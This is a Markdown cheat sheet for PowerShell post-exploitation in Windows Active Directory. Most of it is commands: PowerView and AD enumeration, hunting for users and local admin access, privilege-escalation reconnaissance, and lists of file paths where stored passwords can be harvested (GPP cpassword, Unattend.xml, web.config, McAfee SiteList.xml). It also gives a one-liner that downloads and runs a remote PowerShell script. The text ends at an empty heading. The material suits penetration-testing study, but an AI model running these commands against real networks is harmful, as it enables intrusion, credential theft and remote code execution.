# Powershell post exploitation

## Enumeration

Get Current Domain: `Get-Domain`
Enumerate Other Domains: `Get-Domain -Domain <DomainName>`
Get Domain SID: `Get-DomainSID`

Get Domain Policy: 

`Get-DomainPolicy | Select-Object -ExpandProperty SystemAccess`
`Get-DomainPolicy | Select-Object -ExpandProperty KerberosPolicy`

Domain controllers:

`Get-DomainController`
`Get-DomainController -Domain <DomainName>`

Enumerate Domain Users

```
#Save all Domain Users to a file
Get-DomainUser | Out-File -FilePath .\DomainUsers.txt

#Will return specific properties of a specific user
Get-DomainUser -Identity [username] -Properties DisplayName, MemberOf | Format-List

#Enumerate user logged on a machine
Get-NetLoggedon -ComputerName <ComputerName>

#Enumerate Session Information for a machine
Get-NetSession -ComputerName <ComputerName>

#Enumerate domain machines of the current/specified domain where specific users are logged into
Find-DomainUserLocation -Domain <DomainName> | Select-Object UserName, SessionFromName
```

Enumerate Domain Computers

```
Get-DomainComputer -Properties OperatingSystem, Name, DnsHostName | Sort-Object -Property DnsHostName

#Enumerate Live machines 
Get-DomainComputer -Ping -Properties OperatingSystem, Name, DnsHostName | Sort-Object -Property DnsHostName
```

Enumerate Groups and group members

```
#Save all Domain Groups to a file:
Get-DomainGroup | Out-File -FilePath .\DomainGroup.txt

#Return members of Specific Group (eg. Domain Admins & Enterprise Admins)
Get-DomainGroup -Identity '<GroupName>' | Select-Object -ExpandProperty Member 
Get-DomainGroupMember -Identity '<GroupName>' | Select-Object MemberDistinguishedName

#Enumerate the local groups on the local (or remote) machine. Requires local admin rights on the remote machine
Get-NetLocalGroup | Select-Object GroupName

#Enumerates members of a specific local group on the local (or remote) machine. Also requires local admin rights on the remote machine
Get-NetLocalGroupMember -GroupName Administrators | Select-Object MemberName, IsGroup, IsDomain

#Return all GPOs in a domain that modify local group memberships through Restricted Groups or Group Policy Preferences
Get-DomainGPOLocalGroup | Select-Object GPODisplayName, GroupName
```

Enumerate Shares

```
#Enumerate Domain Shares
Find-DomainShare

#Enumerate Domain Shares the current user has access
Find-DomainShare -CheckShareAccess

#Enumerate "Interesting" Files on accessible shares
Find-InterestingDomainShareFile -Include *passwords*
```

Enumerate Group Policies

```
Get-DomainGPO -Properties DisplayName | Sort-Object -Property DisplayName

#Enumerate all GPOs to a specific computer
Get-DomainGPO -ComputerIdentity <ComputerName> -Properties DisplayName | Sort-Object -Property DisplayName

#Get users that are part of a Machine's local Admin group
Get-DomainGPOComputerLocalGroupMapping -ComputerName <ComputerName>
```

Enumerate OUs

```
Get-DomainOU -Properties Name | Sort-Object -Property Name
```

Enumerate ACLs

```
# Returns the ACLs associated with the specified account
Get-DomaiObjectAcl -Identity <AccountName> -ResolveGUIDs

#Search for interesting ACEs
Find-InterestingDomainAcl -ResolveGUIDs

#Check the ACLs associated with a specified path (e.g smb share)
Get-PathAcl -Path "\\Path\Of\A\Share"
```

Enumerate Domain Trust

```
Get-DomainTrust
Get-DomainTrust -Domain <DomainName>

#Enumerate all trusts for the current domain and then enumerates all trusts for each domain it finds
Get-DomainTrustMapping
```

Enumerate Forest Trust

```
Get-ForestDomain
Get-ForestDomain -Forest <ForestName>

#Map the Trust of the Forest
Get-ForestTrust
Get-ForestTrust -Forest <ForestName>
```

User Hunting

```
#Finds all machines on the current domain where the current user has local admin access
Find-LocalAdminAccess -Verbose

#Find local admins on all machines of the domain
Find-DomainLocalGroupMember -Verbose

#Find computers were a Domain Admin OR a spesified user has a session
Find-DomainUserLocation | Select-Object UserName, SessionFromName

#Confirming admin access
Test-AdminAccess
```

### Access Directory

Get Current Domain: `Get-ADDomain`
Enum Other Domains: `Get-ADDomain -Identity <Domain>`
Get Domain SID: `Get-DomainSID`

Get Domain Controllers

```
Get-ADDomainController
Get-ADDomainController -Identity <DomainName>
```

Enumerate Domain Users

```
Get-ADUser -Filter * -Identity <user> -Properties *

#Get a spesific "string" on a user's attribute
Get-ADUser -Filter 'Description -like "*wtver*"' -Properties Description | select Name, Description
```

Enumerate Domain Computers

```
Get-ADComputer -Filter * -Properties *
Get-ADGroup -Filter * 
```

Enumerate Domain Trust

```
Get-ADTrust -Filter *
Get-ADTrust -Identity <DomainName>
```

Enumerate Forest Trust

```
Get-ADTrust -Filter *
Get-ADTrust -Identity <DomainName>
```

Enumerate Local Applocker Effective Policy `Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections`

### Tools

[LDAP](https://github.com/dirkjanm/ldapdomaindump)
[AD](https://github.com/sense-of-security/ADRecon)
[DNS](https://github.com/dirkjanm/adidnsdump)
[Privilege Account Hunt](https://github.com/cyberark/ACLight)

## Privilege Escalation

### Common commands to use
`systeminfo`
`WMIC CPU Get DeviceID,NumberOfCores,NumberOfLogicalProcessors`
`whoami `
`whoami /priv`
`Lookout for`

- SeDebugPrivilege
- SeRestorePrivilege
- SeBackupPrivilege
- SeTakeOwnershipPrivilege
- SeTcbPrivilege
- SeCreateToken Privilege
- SeLoadDriver Privilege
- SeImpersonate & SeAssignPrimaryToken Priv.

`whoami /groups`
`net user`
`netstat -ano`
`ipconfig /all`
`route print`
`tasklist /SVC > tasks.txt`
`schtasks /query /fo LIST /v > schedule.txt`
`netsh advfirewall show currentprofile`
`netsh advfirewall firewall show rule name=all`
`wmic product get name, version, vendor > apps_versions.txt`
`DRIVERQUERY`
`mountvol`
`accesschk.exe /accepteula`
`accesschk.exe -uws "Everyone" "C:\Program Files"`
`reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer`
`reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer`

Stored Credentials

If system is running an IIS web server the web.config file:

`C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config`
`C:\inetpub\wwwroot\web.config`

Local administrators passwords can also retrieved via the Group Policy Preferences:

`C:\ProgramData\Microsoft\Group Policy\History????\Machine\Preferences\Groups\Groups.xml`

`????\SYSVOL\Policies????\MACHINE\Preferences\Groups\Groups.xml`

Except of the Group.xml file the cpassword attribute can be found in other policy preference files as well such as:

`Services\Services.xml`
`ScheduledTasks\ScheduledTasks.xml`
`Printers\Printers.xml`
`Drives\Drives.xml`
`DataSources\DataSources.xml`

Most Windows systems they are running McAfee as their endpoint protection. The password is stored encrypted in the SiteList.xml file:

`%AllUsersProfile%Application Data\McAfee\Common Framework\SiteList.xml`


## Unattended passwords


Unattended Installs allow for the deployment of Windows with little-to-no active involvement from an administrator. This solution is ideal in larger organizations where it would be too labor and time-intensive to perform wide-scale deployments manually. If administrators fail to clean up after this process, an EXtensible Markup Language (XML) file called Unattend is left on the local system. This file contains all the configuration settings that were set during the installation process, some of which can include the configuration of local accounts, to include Administrator accounts!

While it’s a good idea to search the entire drive, Unattend files are likely to be found within the following folders:

`C:\unattend.xml`
`C:\Windows\Panther\Unattend.xml`
`C:\Windows\Panther\Unattend\Unattend.xml`
`C:\Windows\system32\sysprep.inf`
`C:\Windows\system32\sysprep\sysprep.xml`

`If you find one open it and search for tag. Stored as plaintext or base64.`

## Kernel Exploits

WMIC CPU Get DeviceID,NumberOfCores,NumberOfLogicalProcessors

Use [Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester/blob/master/windows-exploit-suggester.py)

Serlock

Config: Add to the last line the "Find-AllVulns"
Download and run Sherlock:

`echo IEX(New-Object Net.WebClient).DownloadString('http://:/Sherlock.ps1') | powershell -noprofile -`


## Applications and Drivers Exploits

wmic product get name, version, vendor > install_apps.txt

powershell: driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'Start Mode', 'Path'

Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "VMware"}

driverquery /v > drivers.txt

## Insecure File or Folder Permissions




















































































